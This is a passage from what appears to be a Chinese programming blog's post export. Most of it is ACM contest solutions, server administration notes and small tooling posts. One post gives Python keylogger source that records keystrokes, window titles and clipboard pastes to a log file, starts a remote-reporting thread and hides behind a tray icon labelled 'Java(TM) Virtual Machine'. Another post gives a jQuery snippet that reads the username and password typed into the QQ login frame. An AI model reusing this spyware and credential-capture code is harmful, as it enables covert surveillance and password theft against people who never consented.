cout&lt;&lt;\"Total explored area: \"&lt;&lt;unionArea(rects)&lt;&lt;endl&lt;&lt;endl; } return 0; }","link":"/posts/48b0dbfd/"},{"title":"POJ 1177 矩形周长并 扫描线","text":"计算当前扫描线上“进出”矩形的次数，乘上对应“事件”的边长。 /* * File: main.cpp * Author: semprathlon * * Created on April 26, 2016, 7:18 PM */ #include &lt;cstdio&gt; #include &lt;cmath&gt; #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;algorithm&gt; using namespace std; struct Rectangle{ int x1,y1,x2,y2; Rectangle(){} Rectangle(int _x1,int _y1,int _x2,int _y2):x1(_x1),x2(_x2),y1(_y1),y2(_y2){} }; vector&lt;Rectangle&gt; rects; bool cmp(const int&amp; a,const int&amp; b){ if (abs(a-b)&lt;1e-5) return 0; return a-b&lt;0; } int unionPerimeterY(const vector&lt;Rectangle&gt;&amp; rects){ if (rects.empty()) return 0; typedef pair&lt;int,pair&lt;int,int&gt; &gt; Event; vector&lt;Event&gt; events; vector&lt;int&gt; ys; for(int i=0;i&lt;rects.size();++i){ ys.push_back(rects[i].y1); ys.push_back(rects[i].y2); events.push_back(Event(rects[i].x1,make_pair(1,i))); events.push_back(Event(rects[i].x2,make_pair(-1,i))); } sort(ys.begin(),ys.end()); ys.erase(unique(ys.begin(),ys.end()),ys.end()); sort(events.begin(),events.end()); int res=0; int sum[ys.size()]; fill(sum,sum+ys.size(),0); for(int i=0;i&lt;events.size()-1;++i){ int delta=events[i].second.first; int rectangle=events[i].second.second; //update count[] int y1=lower_bound(ys.begin(),ys.end(),rects[rectangle].y1)-ys.begin(),y2=lower_bound(ys.begin(),ys.end(),rects[rectangle].y2)-ys.begin(); if (y1&gt;y2) swap(y1,y2); sum[y1]+=delta; sum[y2]-=delta; int cnt=0,tmp=0; for(int j=0;j&lt;ys.size();j++){ if (!tmp&amp;&amp;sum[j]) cnt++; tmp+=sum[j]; } // cout&lt;&lt;\"i:\"&lt;&lt;i&lt;&lt;\",\"&lt;&lt;cnt&lt;&lt;\",\"&lt;&lt;events[i+1].first-events[i].first&lt;&lt;endl; res+=(events[i+1].first-events[i].first)*(cnt&lt;&lt;1); } return res; } int unionPerimeterX(const vector&lt;Rectangle&gt;&amp; rects){ if (rects.empty()) return 0; typedef pair&lt;int,pair&lt;int,int&gt; &gt; Event; vector&lt;Event&gt; events; vector&lt;int&gt; xs; for(int i=0;i&lt;rects.size();++i){ xs.push_back(rects[i].x1); xs.push_back(rects[i].x2); events.push_back(Event(rects[i].y1,make_pair(1,i))); events.push_back(Event(rects[i].y2,make_pair(-1,i))); } sort(xs.begin(),xs.end()); xs.erase(unique(xs.begin(),xs.end()),xs.end()); sort(events.begin(),events.end()); int res=0; int sum[xs.size()]; fill(sum,sum+xs.size(),0); for(int i=0;i&lt;events.size()-1;++i){ int delta=events[i].second.first; int rectangle=events[i].second.second; //update count[] int x1=lower_bound(xs.begin(),xs.end(),rects[rectangle].x1)-xs.begin(),x2=lower_bound(xs.begin(),xs.end(),rects[rectangle].x2)-xs.begin(); if (x1&gt;x2) swap(x1,x2); sum[x1]+=delta; sum[x2]-=delta; int cnt=0,tmp=0; for(int j=0;j&lt;xs.size();j++){ if (!tmp&amp;&amp;sum[j]) cnt++; tmp+=sum[j]; } // cout&lt;&lt;\"i:\"&lt;&lt;i&lt;&lt;\",\"&lt;&lt;cnt&lt;&lt;\",\"&lt;&lt;events[i+1].first-events[i].first&lt;&lt;endl; res+=(events[i+1].first-events[i].first)*(cnt&lt;&lt;1); } return res; } int main(int argc, char** argv) { ios::sync_with_stdio(false); int n,cas=0; while(cin&gt;&gt;n){ if (!n) break; rects.clear(); for(int i=0;i&lt;n;i++){ int x1,y1,x2,y2; cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2; rects.push_back(Rectangle(x1,y1,x2,y2)); } cout&lt;&lt;unionPerimeterY(rects)+unionPerimeterX(rects)&lt;&lt;endl; } return 0; }","link":"/posts/9e6b295a/"},{"title":"atom编码简记","text":"尝试转入这个github推荐的代码编辑器。 宣传视频非常有趣。 在github平台的依托下，Atom在主题风格、插件扩展上异常灵活。 甚至提供apm install atom-beautify这种命令行安装扩展的方式。","link":"/posts/6e6d6213/"},{"title":"Java中一些基本类型的内存占用","text":"你真的知道Java中boolean类型占用多少个字节吗？","link":"/posts/964009e8/"},{"title":"即时学习js前端开发的一些体会","text":"没有原生支持的类，如何“面向对象”开发 弱类型的js如何判断类型 改善numeric的计算误差","link":"/posts/fcb8aac/"},{"title":"Wordpress 更新错误","text":"刚才升级到WP 4.5.2的时候报了个错，无法复制文件。 就像这样，然而并不是权限设置的错。 其实是虚拟主机空间不够了。","link":"/posts/49834787/"},{"title":"2016江南大学ACM俱乐部招新赛","text":"匆忙而简捷地办完了年度招新活动，实现了第一次JNUOJ线上赛。 搭建OJ时不能实现预期中的多服务器并行处理，但评测效率已满足需求 VJ始终无法使用，不知原BNUOJ开发者是否会继续维护 命题未免太强调难度了 A. 篱笆和人#include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;algorithm&gt; #include &lt;cmath&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;string&gt; #include &lt;queue&gt; #include &lt;map&gt; #include &lt;vector&gt; using namespace std; const int N=100005; const int mod=1e9+7; typedef struct node { int x,y; bool operator &lt; (const node &amp;other) const { if(x!=other.x) return y&lt;other.y; return x&lt;other.x; } }node; int main() { int t,n,h,all=0; while(scanf(\"%d%d\",&amp;n,&amp;h)!=EOF){ all=0; for(int i=1;i&lt;=n;i++) { scanf(\"%d\",&amp;t); if(t&lt;=h) all++; else all+=2; } cout&lt;&lt;all&lt;&lt;endl; } return 0; } B. Water Problem面向新人的提示：不必使用循环结构…… #include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;cstring&gt; using namespace std; int main() { long long t; while(scanf(\"%lld\",&amp;t)!=EOF) { if(!(t%2)) { printf(\"%lld\\n\",((t/2-1)/2)); } else { printf(\"0\\n\"); } } return 0; } C. 交点已知不存在三线交于一点的情况。圆内一个交点就可由两条线段决定，两条线段又由圆上的四个不同点决定。从圆上选取4个点的组合，$latex C^4_n = \\frac{n(n-1)(n-2)(n-3)}{24}$。另还有圆上的n个点要计算。 T=int(input()) while T&gt;0: T-=1 n=int(input()) print n+n*(n-1)*(n-2)*(n-3)/24 D. 食物处理器#include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;algorithm&gt; #include &lt;cmath&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;string&gt; #include &lt;queue&gt; #include &lt;map&gt; #include &lt;vector&gt; using namespace std; const int N=100005; const int mod=1e9+7; int val[N]; int main() { int k,n,h,c; long long time=0; while(scanf(\"%d %d %d\",&amp;n,&amp;h,&amp;k)!=EOF) { c=0,time=0; for(int i=1;i&lt;=n;i++) { scanf(\"%d\",&amp;val[i]); } for(int i=1;i&lt;=n;i++) { while(c+val[i]&gt;h) { if(c&gt;k) { int qwe=c; qwe/=k; time+=qwe; c=c%k; } else { c-=k; if(c&lt;0) c=0; time++; } } c+=val[i]; } time+=c/k; if(c%k!=0) { time++; } cout&lt;&lt;time&lt;&lt;endl; } return 0; } E. 最大计算值#include&lt;stdio.h&gt; #include&lt;string.h&gt; #include&lt;algorithm&gt; using namespace std; char s[111]; int num[111]; int dp[111][111]; char cal[111]; int calu(int a,int b,char c) { if(c=='*') return a*b; else if(c=='+') return a+b; else if(c=='-') return a-b; } int main() { int T; scanf(\"%d\",&amp;T); for(int i=0;i&lt;T;i++) { scanf(\"%s\",s); int n=strlen(s); int len=0; for(int i=0;i&lt;100;i++) for(int j=0;j&lt;100;j++) dp[i][j]=-1e9; for(int i=0;i&lt;n;i++) { int k=0; while(s[i]&gt;='0'&amp;&amp;s[i]&lt;='9') { k*=10; k+=s[i]-'0'; i++; } dp[len++][len-1]=k; cal[len-1]=s[i]; } for(int i=2;i&lt;=len;i++) { for(int l=0;l&lt;len;l++) { int r=l+i-1; if(r&gt;=len)break; for(int k=l;k&lt;r;k++) dp[l][r]=max(dp[l][r],calu(dp[l][k],dp[k+1][r],cal[k])); } } printf(\"%d\\n\",dp[0][len-1]); } return 0; } F. 有趣的字符串#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn=100005; char s[maxn]; int a[maxn]; int n,k; int work(){ int s=0,t=0,ans=0; int cnt=0; while( s&lt;=t ){ while( cnt&lt;=k &amp;&amp;t&lt;n ){ if( a[t]==0 ){ cnt++; } if(cnt&lt;=k) ans=max( ans,t-s+1 ); t++; } if( a[s]==0 )cnt--; s++; } return ans; } int main() { int t; scanf(\"%d\",&amp;t); while(t--){ scanf(\"%d%d\",&amp;n,&amp;k); scanf(\"%s\",s); for(int i=0;i&lt;n;i++){ a[i]=s[i]-'a'; } int ans1=work(); for(int i=0;i&lt;n;i++)a[i]=a[i]?0:1; int ans2=work(); printf(\"%d\\n\",max(ans1,ans2)); } return 0; } 稍暴力些的做法也可： #include&lt;bits/stdc++.h&gt; using namespace std; const int maxn=100005; char s[maxn]; int a[maxn]; int n,k; int dp[maxn]; int work(){ int ans=0; for(int i=1;i&lt;=n;i++){ for(int j=i;j&lt;=n;j++){ int tmp=dp[j]-dp[i-1]; if(tmp&lt;=k) ans=max(ans,j-i+1); } } return ans; } int main() { int t; scanf(\"%d\",&amp;t); while(t--){ scanf(\"%d%d\",&amp;n,&amp;k); scanf(\"%s\",s); //cout&lt;&lt;\"haha\"&lt;&lt;endl; a[0]=dp[0]=0; for(int i=0;i&lt;n;i++){ a[i+1]=s[i]-'a'; } for(int i=1;i&lt;=n;i++){ dp[i]=dp[i-1]+a[i]; } int ans1=work(); for(int i=1;i&lt;=n;i++)a[i]=a[i]?0:1; for(int i=1;i&lt;=n;i++){ dp[i]=dp[i-1]+a[i]; } int ans2=work(); printf(\"%d\\n\",max(ans1,ans2)); } return 0; } G. 我的世界/** Sep 19, 2015 7:12:36 PM * PrjName:Bc56-01 * @author Semprathlon */ import java.io.*; import java.util.*; public class Main { /** * @param args */ final static int maxn=110; static int cnt; static int[] w; static HashMap&lt;Integer, Integer&gt; mp=new HashMap&lt;Integer,Integer&gt;(); public static void main(String[] args){ // TODO Auto-generated method stub Scanner in=new Scanner(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(); //h=new int[maxn]; w=new int[maxn]; while(T--&gt;0){ int n=in.nextInt(); cnt=0; mp.clear(); Arrays.fill(w, 0); for(int i=1;i&lt;=n;i++){ int k=in.nextInt(); if (mp.containsKey(k)) w[mp.get(k)]+=in.nextInt(); else{ w[cnt]+=in.nextInt(); mp.put(k, cnt++); } } int sum=0; for(int i=0;i&lt;cnt;i++) sum+=(w[i]+63)/64; out.println((sum+35)/36); } out.flush(); out.close(); } } H. 尼古拉斯和数组#include &lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;cmath&gt; #include&lt;algorithm&gt; #include&lt;cstring&gt; using namespace std; const int maxn=105; int num[maxn]; int main() { int n; while(~scanf(\"%d\",&amp;n)) { memset(num,0,sizeof(num)); for(int i=1;i&lt;=n;i++) { scanf(\"%d\",&amp;num[i]); } int minpos=0; int maxpos=0; for(int i=1;i&lt;=n;i++) { if(num[i]==1) { minpos=i; } if(num[i]==n) { maxpos=i; } } int len=0; len=abs(maxpos-minpos); int ans=0; if(len==n-1) { ans=n-1; } else { ans=max(ans,abs(maxpos-1)); ans=max(ans,abs(n-maxpos)); ans=max(ans,abs(minpos-1)); ans=max(ans,abs(minpos-n)); } cout &lt;&lt; ans &lt;&lt; endl; } return 0; } I. 奇妙的&amp;操作#include&lt;stdio.h&gt; #include&lt;string.h&gt; #include&lt;algorithm&gt; #include&lt;string&gt; #include&lt;iostream&gt; using namespace std; typedef long long ll; const ll mod=1000000007; char s[111111]; int cal(int num) { int res=6; for(int i=0; i&lt;6; i++) if((1&lt;&lt;i)&amp;num) res--; return res; } int main() { while(~scanf(\"%s\",s)) { int n=strlen(s); ll ans=1; for(int i=0; i&lt;n; i++) { int num; if(s[i]&gt;='0'&amp;&amp;s[i]&lt;='9') num=s[i]-'0'; else if(s[i]&gt;='a'&amp;&amp;s[i]&lt;='z') num=s[i]-'a'+36; else if(s[i]&gt;='A'&amp;&amp;s[i]&lt;='Z') num=s[i]-'A'+10; else if(s[i]=='-') num=62; else num=63; int k=cal(num); while(k--) { ans*=3; ans%=mod; } ans%=mod; } //cout&lt;&lt;ans&lt;&lt;endl; printf(\"%lld\\n\",ans); } return 0; } J. 推箱子【题意存疑】怎样在单个地读入字符时排除换行符的影响？ #include &lt;cstdio&gt; #include &lt;cstdlib&gt; #include &lt;cstring&gt; #include &lt;algorithm&gt; #include &lt;climits&gt; using namespace std; int main() { char y,x; int n; while(scanf(\" %c \",&amp;y)!=EOF) { scanf(\"%d\",&amp;n); if(n&amp;1) { if(y=='A') printf(\"B\\n\"); else printf(\"A\\n\"); } else { printf(\"%c\\n\",y); } } return 0; }","link":"/posts/c26b7d3f/"},{"title":"解决jdbc连接SQL Server常见连接错误","text":"错误信息：通过端口 1433 连接到主机 localhost 的 TCP/IP 连接失败。错误:“connect timed out。请验证连接属性。确保 SQL Server 的实例正在主机上运行，且在此端口接受 TCP/IP 连接，还要确保防火墙没有阻止到此端口的 TCP 连接。”。 重要前提： 确保数据库允许远程连接 确保登录名允许远程连接 检查错误：打开Sql Server Configuration Manager，选中左栏SQL Server网络配置=&gt;&lt; 服务名&gt;的协议，双击TCP/IP以弹出对话框。 特别注意最下方IPAll项的端口设置。按图设置，重启SQL Server服务后生效。 telnet 127.0.0.1 1433 可供测试端口。","link":"/posts/46b7e7bd/"},{"title":"2016年上半年写前端的点滴汇总","text":"其实只做了一件事情：写异步回调函数。 附带的成就是知道了如何调用cdn资源，如何使用bootstrap框架，如何jquery.","link":"/posts/c628c93e/"},{"title":"【160610】服务器管理记录","text":"Ubuntu查看运行中的进程及其id、监听端口 sudo netstat -anp 查询进程id pidof 安全终止某个进程 kill -15 后台运行某个进程 nohup&amp; 内存空间不足的临时解决办法How To Create A Swap File In Linux linux下由于内存不足造成的 virtual memory exhausted: Cannot allocate memory, qt **.o文件 file not found configure-apache-to-listen-on-port-other-than-80 http://askubuntu.com/questions/256013/could-not-reliably-determine-the-servers-fully-qualified-domain-name","link":"/posts/421172c6/"},{"title":"【160712】服务器管理记录","text":"mysql change a user password SET PASSWORD FOR ‘user-name-here‘@’hostname-name-here’ = PASSWORD(‘new-password-here’); 开启php的curl功能 sudo apt-get install php5-curl","link":"/posts/bcfb4fda/"},{"title":"py编写blog爬虫初步","text":"教程指导 urllib2.HTTPError: HTTP Error 403: Forbidden 需添加header以伪装成浏览器访问。 UnicodeEncodeError: ‘gbk’ codec can’t encode character u’\\u200e’ in position 43: illegal multibyte sequence 应在编码转换时略去无关紧要的不可见字符。参见 import urllib import urllib2 import re import os def mkdir(path): path = path.strip() isExists=os.path.exists(path) if not isExists: os.makedirs(path) return True else: return False def output_file(dir,name,content,charset): fileName = dir + \"/\" + name#.encode('utf-8','ignore') f = open(fileName,\"w+\") f.write(content.encode(charset,'ignore')) print \"Output file\",fileName def scan_article(host,link,dir,charset): url=host+link request = urllib2.Request(url) # disguising web browser headers request.add_header('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36') response=urllib2.urlopen(request) html= response.read().decode('utf-8','ignore') # print html pattern=re.compile(r'&lt;span class=\"link_title\"&gt;&lt;a href=\".*\"&gt;\\s*([\\s\\S]*?)\\s*&lt;/a&gt;') matches=re.findall(pattern,html) if matches: title=matches[0] # filename=re.sub(\"\\s+\",\"_\",title) filename=re.sub(r'[\\s\\\\\\\\\\\\/:\\\\*\\\\?\"&lt;&gt;\\\\|]+',\"_\",title) #print title,\"[\",filename,\"]\" else: print \"No title matches\" return pattern=re.compile(r'&lt;div id=\"main\"&gt;\\s*([\\s\\S]*?)\\s*&lt;/div&gt;\\s*&lt;div id=\"side\"&gt;') matches=re.findall(pattern,html) if matches: html=matches[0] # print html else: print \"No contents\" return # print \"Output file\",filename+'.html' try: output_file(dir,filename+'.html',html,charset); except Exception as e: print str(e) return def scan_page(id,host,url,dir,charset): request = urllib2.Request(host+url+str(id)) # disguising web browser headers request.add_header('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36') response=urllib2.urlopen(request) html= response.read().decode('utf-8','ignore') # print html; pattern=re.compile(r'&lt;span.*class=\"link_title\"&gt;([\\s\\S]*?)&lt;/span&gt;',re.I|re.M) items=re.findall(pattern,html) if items: # print items for item in items: next=re.match(re.compile(r'&lt;a href=\"(.+?)\"&gt;\\s*([\\s\\S]+\\S)\\s*&lt;/a&gt;'),item) if next: href=next.group(1) title=next.group(2) scan_article(host,href,dir,charset) # print href,\"-&gt;\",title,\"[\",filename,\"]\" else: print \"Invalid item\" return else: print \"No title matches\" return dir='data/csdn_utf-8'; host=\"http://blog.csdn.net\" url=\"/u013491262/article/list/\" charset='utf-8' mkdir(dir) # scan_article(host,\"/u013491262/article/details/20783371\",dir,'utf-8') for i in range(28,31): print \"page \",str(i),\":\" dir='data/csdn_utf-8'+\"/\"+str(i).zfill(2) mkdir(dir) scan_page(i,host,url,dir,charset)","link":"/posts/ba53dafc/"},{"title":"开发者 高质量文摘","text":"编程语言Python Cookbook 3rd Edition Documentation 正则表达式RegExp对象 ——来自《JavaScript 标准参考教程（alpha）》，by 阮一峰 爬虫框架开源python网络爬虫框架Scrapy 数据可视化逆向工程网络攻防大学霸 Kali Linux 安全渗透教程","link":"/posts/fe8d1170/"},{"title":"【160713】服务器管理记录","text":"Switch Ubuntu apt-get source sudo cp /etc/apt/sources.list /etc/apt/sources.list_backupsudo nano /etc/apt/sources.list Be aware to choose the corresponding version. deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiverse uname -a","link":"/posts/1970dfd4/"},{"title":"【160718】ACM俱乐部暑期交流","text":"C++兼容C，但C++不是C的超集。 gcc与Visual C++分别代表两种编译器套装，各自都包含C编译器和C++编译器。 gcc或Visual C++都根据源代码文件的扩展名*.c/*.cpp选择语言，但评测时的语言选项并非如此。提交代码时如需选择语言或编译器，(GNU) gcc=C语言，g++=C++；(Microsoft) C=C语言，(Microsoft) C++=C++. 可以把C语言代码当做C++代码提交。 C语言标准 gcc编译选项 ANSI C(C89) -ansi C99 -std=c99 C11 -std=c11 评测环境、选项会在OJ、正式比赛的文件上说明。 64位整数的输入输出__int64类型只能在Visual C++中使用。long long的输入输出格式符为%I64d或%lld，会出错？unsigned long long的输入输出格式符为%I64u或%llu，会出错？ 输入若干组数据？利用scanf函数的返回值。利用gets函数的返回值。 变量的内存空间分配 静态区： 保存自动全局变量和 static 变量（包括 static 全局和局部变量）。静态区的内容在总个程序的生命周期内都存在，由编译器在编译的时候分配。 堆： 由 malloc 系列函数或 new 操作符分配的内存，其生命周期由 free 或 delete 决定。在没有释放之前一直存在，直到程序结束，其特点是使用灵活，空间比较大，但容易出错 栈： 保存局部变量，栈上的内容只在函数的范围内存在，当函数运行结束，这些内容也会自动被销毁，其特点是效率高，但空间大小有限","link":"/posts/49696186/"},{"title":"","text":"$ x= \\int v_x {\\rm d}t $$ y= \\int v_y {\\rm d}t $$ \\left|v \\right|= \\sqrt{x^2 + y^2} = v_1 $","link":"/posts/0/"},{"title":"台式机高级维护","text":"台式机高级维护，定期性大规模清灰，把硅脂均匀涂在CPU表面","link":"/posts/3d9b25a3/"},{"title":"黑苹果HD3000潜在的驱动方案","text":"动态内核加载 修复进度 参数设置","link":"/posts/1e64afd/"},{"title":"低配置机器上运行Chrome的要点","text":"关闭Flash插件！ chrome://plugins 至于是否要用32bit版本代替64bit，还不是很清楚。","link":"/posts/aae4a11a/"},{"title":"QQ logging-in interface via web","text":"Basically,the major part of the logging webpage is an iframe whose href like: http://ui.ptlogin2.qq.com/cgi-bin/login |paramete|value(for example)| |—|—| |appid|1006401 |bgcolor |ffffff |daid |377 |dummy |1 |f_url |loginerroralert |hide_close_icon |1 |hide_title_bar |1 |link_target |blank |s_url | http://connect.qq.com/manage/index |style | 0 jQuery: get the input pass &amp; key $('#login_frame').contents().find('#login_button').click( function(e){ console.log($('#login_frame').contents().find('#u').attr('value')); console.log($('#login_frame').contents().find('#p').attr('value')); } );","link":"/posts/98d5ad35/"},{"title":"Install Linux on Surface 3 (Non Pro)","text":"Prevent boot into Windows automatically when boot from SSD Rename or remove the /EFI/Microsoft in the EFI partition. Why the bash replied “fdisk/mkfs command not found?” Because /sbin is not appended to the $PATH.","link":"/posts/b609d80/"},{"title":"GPT磁盘分区丢失后的恢复","text":"起因：使用Ghost 11.0.2恢复时出现错误代码29005，丢失所有分区。 既未备份分区表，又无法搜索到丢失分区。 后在所有丢失范围内新建一整个未格式化分区，进行文件恢复。 后测试了Ghost备份镜像，登录到win7时报错Group policy client服务未能登陆，拒绝访问，正是之前的致命错误。可能是由于用mklink命令将用户文件夹转移到了D盘。","link":"/posts/41ad12dc/"},{"title":"Ajax 异步发送和接收 常用封装方法","text":"POST详细型[code lang=”js”]$.ajax({ type: ‘POST’, url: ‘target_url’, data: { }, success: function (returnData) { // TODO } });[/code]","link":"/posts/3c00e12e/"},{"title":"Wordpress config中站点地址或url地址错误的紧急修复","text":"由于配置不当或域名变更造成wp站点无法访问，需要修改数据表： use [wp_db_name]update wp_options set option_value=’[url]’ where option_name=’siteurl’;update wp_options set option_value=’[url]’ where option_name=’home’;","link":"/posts/7b1653f2/"},{"title":"py2exe 打包失败","text":"安装了py2exe x64，发现有功能缺陷，不支持打包生成单个Windows可执行文件。也未能注册windows服务。","link":"/posts/87291b70/"},{"title":"Windows7及以后版本操作系统的安装镜像，Legacy引导还是UEFI引导？","text":"Win7安装镜像可以以UEFI方式引导启动，但这样只能安装系统到GPT硬盘上，反之亦然。 Win7安装镜像的EFI引导文件不完善，需要从win8及以后的系统或安装镜像中获取EFI文件夹。 EFI\\boot\\bootx64.efi等同于bootmgfw.efi. 而且对于众多OEM的品牌机而言，只要EFI/microsoft存在，则自动引导启动Windows系统。","link":"/posts/3d2f7e42/"},{"title":"关于常见网络设备上运行的嵌入式系统的初步认识","text":"在企业型的大型网关设备上常见Unix操作系统，TTL=255. 在个人型的小型路由器、交换机上常见Linux操作系统，TTL=63. 通过端口扫描可得到目标主机上开放的端口、运行的服务，进而推断操作系统。 ssh常用端口为22，telnet常用端口为23.","link":"/posts/797285c2/"},{"title":"py编写键盘记录器初步","text":"调用win32 API记录键盘事件、窗口事件 # def get_current_process(): # 获取最上层的窗口句柄 hwnd = user32.GetForegroundWindow() # 获取进程ID pid = c_ulong(0) user32.GetWindowThreadProcessId(hwnd,byref(pid)) # 将进程ID存入变量中 process_id = \"%d\" % pid.value # 申请内存 executable = create_string_buffer(\"\\x00\"*512) h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid) psapi.GetModuleBaseNameA(h_process,None,byref(executable),512) # 读取窗口标题 windows_title = create_string_buffer(\"\\x00\"*512) length = user32.GetWindowTextA(hwnd,byref(windows_title),512) # 打印 # print # print \"[ PID:%s-%s-%s]\" % (process_id,executable.value,windows_title.value) # print Thread(target=report_to_remote_server).start() output_file('','KeyLog.ini',\"\\n[ PID:%s-%s-%s] %s\\n\" % (process_id,executable.value,windows_title.value,time.strftime(\"%Y/%m/%d %H:%M:%S\"))); # 关闭handles kernel32.CloseHandle(hwnd) kernel32.CloseHandle(h_process) # 定义击键监听事件函数 def KeyStroke(event): global current_window # 检测目标窗口是否转移(换了其他窗口就监听新的窗口) if event.WindowName != current_window: current_window = event.WindowName # 函数调用 get_current_process() # 检测击键是否常规按键（非组合键等） if event.Ascii &gt; 32 and event.Ascii &lt;127: # print chr(event.Ascii), output_file('','KeyLog.ini',chr(event.Ascii)) else: # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来 if event.Key == \"V\": win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() # print \"[PASTE]-%s\" % (pasted_value), output_file('','KeyLog.ini',\"[PASTE]-%s\" % (pasted_value)) else: # print \"[%s]\" % event.Key, output_file('','KeyLog.ini',\"[%s]\" % event.Key) # 循环监听下一个击键事件 return True def RegisterKeyListener(): # 创建并注册hook管理器 kl = pyHook.HookManager() kl.KeyDown = KeyStroke # 注册hook并执行 kl.HookKeyboard() pythoncom.PumpMessages() 但是对于QQEdit.exe，记录值会受到干扰。 日志记录 def output_file(dir,name,content): fileName = '' if len(dir)&gt;0: fileName = fileName+dir + \"/\" fileName = fileName + name#.encode('utf-8','ignore') f = open(fileName,\"a\") f.write(content) # print \"Output file\",fileName Tk GUI 支持异步多线程操作的UI库 class Tk_App: def __init__(self,master): #构造函数里传入一个父组件(master),创建一个Frame组件并显示 frame = Frame(master) frame.pack() #创建两个button，并作为frame的一部分 self.button = Button(frame, text=\"QUIT\", fg=\"red\", command=sys.exit)# frame.quit self.button.pack(side=LEFT) #此处side为LEFT表示将其放置 到frame剩余空间的最左方 self.hi_there = Button(frame, text=\"Hello\", command=self.say_hi) self.hi_there.pack(side=LEFT) # Thread(target=RegisterKeyListener).start() # sys.stdout.flush() def say_hi(self): print \"hi there, this is a class example!\" TRAY_TOOLTIP = 'Java(TM) Virtual Machine' TRAY_ICON = 'icon.png' def create_menu_item(menu, label, func): item = wx.MenuItem(menu, -1, label) menu.Bind(wx.EVT_MENU, func, id=item.GetId()) menu.AppendItem(item) return item class TaskBarIcon(wx.TaskBarIcon): def __init__(self,frame): self.frame=frame super(TaskBarIcon, self).__init__() self.set_icon(TRAY_ICON) self.Bind(wx.EVT_TASKBAR_LEFT_DOWN, self.on_left_down) mainth.start(); def CreatePopupMenu(self): menu = wx.Menu() # create_menu_item(menu, 'Say Hello', self.on_hello) create_menu_item(menu,'Control Panel',self.on_control); menu.AppendSeparator() create_menu_item(menu, 'Exit', self.on_exit) # create_menu_item(menu, 'Exit', sys.exit) return menu def set_icon(self, path): icon = wx.IconFromBitmap(wx.Bitmap(path)) self.SetIcon(icon, TRAY_TOOLTIP) def on_left_down(self, event): print 'Tray icon was left-clicked.' def on_hello(self, event): print 'Hello, world!' def on_control(self,event): # print r'\"%JAVA_HOME%\\jre\\bin\\javacpl.exe\"' # os.system(r'cd /d %JAVA_HOME%'); os.system(r'\"\"%JAVA_HOME%\\jre\\bin\\javacpl.exe\"\"'); # print os.path.realpath(sys.argv[0]) # print os.path.dirname(sys.argv[0]) # print os.path.basename(sys.argv[0]) def on_exit(self, event): wx.CallAfter(self.Destroy) self.frame.Close() mainth._Thread__stop() # sys.exit() class App(wx.App): def OnInit(self): frame=wx.Frame(None) self.SetTopWindow(frame) TaskBarIcon(frame) return True","link":"/posts/27b659b8/"},{"title":"首次刷上了原生Android","text":"拿到了红米2联通版做备用机、开发机。 选用Nexus Experience ROM配合GAPPS。 CyanogenMod14非稳定版，有待观察。 CyanogenMod13私人编译，不清洁，不支持联通LTE。","link":"/posts/53c833ce/"},{"title":"【161016】ACM俱乐部区域赛前交流","text":"在线算法与离线算法 假设举办江大程序设计校赛时要提供代码打印服务，通常情况下并发请求量并不大。我们的系统每接收到一条打印请求，就立即响应并指示打印机打出代码，这就是在线算法的工作策略。但在关键时刻可能会有大量请求蜂拥而来，服务器临时“宕机”了一下不能立即回应；请求就在缓冲池里堆积了起来。管理员看不下去了，马上出手打印了一大叠代码纸。这就好比是另一种工作策略——离线算法。 接着举例说明在线/离线的不同工作方式对算法设计的影响。 JNUOJ1150 线段覆盖 给出数轴上N条线段，每条线段用两个数表示A,B $latex (-10^9 \\leq A \\lt B \\leq 10^9) $ ，表示从a到b的一条线段。现在请你求出它们覆盖数轴上的多长距离。 空间中各个点的状态记录与增量记录这里有了个现成的数轴的概念，数轴是个一维空间，上面的各个位置具有被覆盖与不被覆盖两种状态。一条线段具有左端点和右端点两个属性，对左右端点之间各个位置产生状态改变。可以用一维数组记录（有需要知道的）各个位置的状态。考虑到同一个位置会被多条线段覆盖，那么修改增量（改变量）记录以便最终一次性更新。如果线段端点散步范围不大的话就这么做了。可是散布范围太大了，不论是评测机还是编译器都不会接受$ 10^9 $规模的数组。 压缩空间并不是$ 10^9 $个位置都成为端点，可以作端点的位置至多$ 2N $个。要像制造“空间扭曲”一样缩短这个数轴，缩短遥远的端点之间的虚拟距离。现在把各个端点按照顺序映射到更紧密的空间上，也就是给每个位置按顺序分配一个虚拟ID。这样状态存储的空间就被压缩了，同时能够获知虚拟点之间的真实距离。 #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;algorithm&gt; const int maxn=1000010; int l[maxn],r[maxn],delta[maxn*2]; std::vector&lt;int&gt; list; int main(){ int n; while(std::cin&gt;&gt;n){ list.clear(); std::fill(delta,delta+maxn*2,0); for(int i=0;i&lt;n;i++){ std::cin&gt;&gt;l[i]&gt;&gt;r[i]; list.push_back(l[i]); list.push_back(r[i]); } std::sort(list.begin(),list.end()); 